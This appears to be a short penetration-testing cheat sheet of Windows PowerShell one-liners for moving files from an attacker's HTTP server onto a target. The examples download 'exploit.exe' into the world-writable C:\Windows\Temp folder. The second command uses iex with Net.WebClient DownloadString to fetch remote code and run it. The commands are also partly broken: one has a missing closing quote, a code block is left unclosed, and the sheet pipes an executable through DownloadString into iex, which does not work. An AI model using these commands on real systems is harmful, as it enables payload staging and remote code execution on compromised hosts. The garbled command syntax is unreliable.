# Windows HTTP File Transfer

*********************************************************************************
Items inside [SQUARE-BRACKETS] indicate changeable (fill in the blank) fields.  
Note: Bracket charactors themselves [ ] require removal. See examples.
*********************************************************************************

### When wget is not available/usable on a Windows machine use this command to pull files from an http server:
```
powershell -c "Invoke-WebRequest -Uri '[HTTP-SERVER-IP]/[FILE]' -OutFile '[FILE-PATH]'"
```
Example:
```
powershell -c "Invoke-WebRequest -Uri '10.10.100.254/exploit.exe' -OutFile 'C:\Windows\Temp\exploit.exe'"
```
*********************************************************************************
Note: C:\Windows\Temp is commonly world writable
*********************************************************************************
### Another useful command to achieve succesful http file transfer via powershell:
```
powershell iex (New-Object Net.WebClient).DownloadString('http://[HTTP-SERVER-IP]:[PORT]/[FILE])
```
Example:
```
powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.100.254:80/exploit.exe)
